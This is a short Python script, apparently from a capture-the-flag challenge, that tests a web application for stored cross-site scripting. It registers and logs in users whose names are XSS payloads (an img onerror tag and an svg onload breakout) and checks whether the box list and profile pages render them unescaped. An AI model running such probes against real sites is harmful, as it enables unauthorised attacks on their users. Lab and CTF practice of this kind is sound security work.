import os, sys, requests, re, urllib.parse
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
OUT=open("artifacts/out.txt","w")
def log(*a):
    s=" ".join(str(x) for x in a); print(s); OUT.write(s+"\n")
def g(label,r,limit=2500):
    log("--",label,r.status_code,"len",len(r.content))
    log(r.text[:limit])
user="<img src=x onerror=alert(9)>"
p="pw123456"
s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
r=s.post(BASE+"/register",data={"username":user,"password":p},timeout=20,allow_redirects=False)
g("register evil",r,400)
r=s.post(BASE+"/login",data={"username":user,"password":p},timeout=20,allow_redirects=False)
g("login evil",r,400)
log("cookies",s.cookies.get_dict())
g("boxes evil",s.get(BASE+"/boxes",timeout=20),1800)
uenc=urllib.parse.quote(user,safe='')
g("profile evil",s.get(BASE+"/u/"+uenc,timeout=20),1800)
g("profile evil2",s.get(BASE+"/u/"+user.replace(' ','%20'),timeout=20),600)
# try username with quotes
user2='"><svg onload=alert(1)>'
s2=requests.Session()
r=s2.post(BASE+"/register",data={"username":user2,"password":p},timeout=20,allow_redirects=False)
g("register evil2",r,300)
r=s2.post(BASE+"/login",data={"username":user2,"password":p},timeout=20,allow_redirects=False)
g("login evil2",r,300)
g("boxes evil2",s2.get(BASE+"/boxes",timeout=20),1500)
OUT.close()
